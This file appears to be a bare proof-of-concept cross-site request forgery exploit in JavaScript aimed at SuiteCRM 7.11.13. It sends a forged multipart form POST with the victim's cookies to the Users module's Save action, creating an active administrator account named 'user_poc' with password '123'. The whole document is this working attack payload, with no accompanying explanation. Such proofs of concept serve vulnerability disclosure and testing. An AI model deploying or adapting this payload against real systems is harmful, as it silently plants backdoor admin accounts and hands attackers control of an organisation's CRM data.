var xhr = new XMLHttpRequest();
xhr.open("POST", "http://mysite.com/SuiteCRM-7.11.13/index.php", true);
xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------41893167625842532773166588889");
xhr.withCredentials = true;
var body = "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"display_tabs_def\"\r\n" + 
  "\r\n" + 
  "display_tabs[]=Home&display_tabs[]=Accounts&display_tabs[]=Contacts&display_tabs[]=Opportunities&display_tabs[]=Leads&display_tabs[]=AOS_Quotes&display_tabs[]=Calendar&display_tabs[]=Documents&display_tabs[]=Emails&display_tabs[]=Spots&display_tabs[]=Campaigns&display_tabs[]=Calls&display_tabs[]=Meetings&display_tabs[]=Tasks&display_tabs[]=Notes&display_tabs[]=AOS_Invoices&display_tabs[]=AOS_Contracts&display_tabs[]=Cases&display_tabs[]=Prospects&display_tabs[]=ProspectLists&display_tabs[]=Project&display_tabs[]=AM_ProjectTemplates&display_tabs[]=FP_events&display_tabs[]=FP_Event_Locations&display_tabs[]=AOS_Products&display_tabs[]=AOS_Product_Categories&display_tabs[]=AOS_PDF_Templates&display_tabs[]=jjwg_Maps&display_tabs[]=jjwg_Markers&display_tabs[]=jjwg_Areas&display_tabs[]=jjwg_Address_Cache&display_tabs[]=AOR_Reports&display_tabs[]=AOW_WorkFlow&display_tabs[]=AOK_KnowledgeBase&display_tabs[]=AOK_Knowledge_Base_Categories&display_tabs[]=EmailTemplates&display_tabs[]=Surveys&\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"hide_tabs_def\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"remove_tabs_def\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"module\"\r\n" + 
  "\r\n" + 
  "Users\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"record\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"action\"\r\n" + 
  "\r\n" + 
  "Save\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"page\"\r\n" + 
  "\r\n" + 
  "EditView\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"return_module\"\r\n" + 
  "\r\n" + 
  "Users\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"return_id\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"return_action\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"password_change\"\r\n" + 
  "\r\n" + 
  "true\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"required_password\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"old_user_name\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"type\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"is_group\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"portal_only\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"is_admin\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"is_current_admin\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"edit_self\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"required_email_address\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"isDuplicate\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"user_name\"\r\n" + 
  "\r\n" + 
  "user_poc\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"first_name\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"status\"\r\n" + 
  "\r\n" + 
  "Active\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"last_name\"\r\n" + 
  "\r\n" + 
  "user_poc\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"UserType\"\r\n" + 
  "\r\n" + 
  "Administrator\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"deleteAttachment\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"photo\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"photo_record_id\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"photo_escaped\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"photo_file\"; filename=\"\"\r\n" + 
  "Content-Type: application/octet-stream\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"factor_auth\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"employee_status\"\r\n" + 
  "\r\n" + 
  "Active\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"show_on_employees\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"show_on_employees\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"title\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"phone_work\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"department\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"phone_mobile\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"reports_to_name\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"reports_to_id\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"phone_other\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"phone_fax\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"phone_home\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"messenger_type\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"messenger_id\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"address_street\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"address_city\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"address_state\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"address_postalcode\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"address_country\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"description\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users_email_widget_id\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"emailAddressWidget\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users0emailAddress0\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users0emailAddressId0\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users0emailAddressVerifiedFlag\"\r\n" + 
  "\r\n" + 
  "true\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users0emailAddressVerifiedEmailValue\"\r\n" + 
  "\r\n" + 
  "true\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users_email_widget_id\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"emailAddressWidget\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"Users0emailAddressPrimaryFlag\"\r\n" + 
  "\r\n" + 
  "Users0emailAddress0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"useEmailWidget\"\r\n" + 
  "\r\n" + 
  "true\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"email_link_type\"\r\n" + 
  "\r\n" + 
  "sugar\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"editor_type\"\r\n" + 
  "\r\n" + 
  "mozaik\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"old_password\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"new_password\"\r\n" + 
  "\r\n" + 
  "123\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"confirm_new_password\"\r\n" + 
  "\r\n" + 
  "123\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"export_delimiter\"\r\n" + 
  "\r\n" + 
  ",\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"receive_notifications\"\r\n" + 
  "\r\n" + 
  "12\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"default_export_charset\"\r\n" + 
  "\r\n" + 
  "UTF-8\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"reminder_checked\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"reminder_time\"\r\n" + 
  "\r\n" + 
  "60\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"email_reminder_checked\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"email_reminder_time\"\r\n" + 
  "\r\n" + 
  "60\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"use_real_names\"\r\n" + 
  "\r\n" + 
  "on\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"dateformat\"\r\n" + 
  "\r\n" + 
  "m/d/Y\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"currency\"\r\n" + 
  "\r\n" + 
  "-99\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"timeformat\"\r\n" + 
  "\r\n" + 
  "h:ia\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"default_currency_significant_digits\"\r\n" + 
  "\r\n" + 
  "2\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"timezone\"\r\n" + 
  "\r\n" + 
  "Europe/Berlin\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"ut\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"num_grp_sep\"\r\n" + 
  "\r\n" + 
  ",\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"default_locale_name_format\"\r\n" + 
  "\r\n" + 
  "s f l\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"dec_sep\"\r\n" + 
  "\r\n" + 
  ".\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"calendar_publish_key\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"fdow\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"subtheme\"\r\n" + 
  "\r\n" + 
  "Dawn\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"use_group_tabs\"\r\n" + 
  "\r\n" + 
  "m\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"use_group_tabs\"\r\n" + 
  "\r\n" + 
  "gm\r\n" + 
  "-----------------------------41893167625842532773166588889\r\n" + 
  "Content-Disposition: form-data; name=\"user_subpanel_tabs\"\r\n" + 
  "\r\n" + 
  "on\r\n" + 
  "-----------------------------41893167625842532773166588889--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));
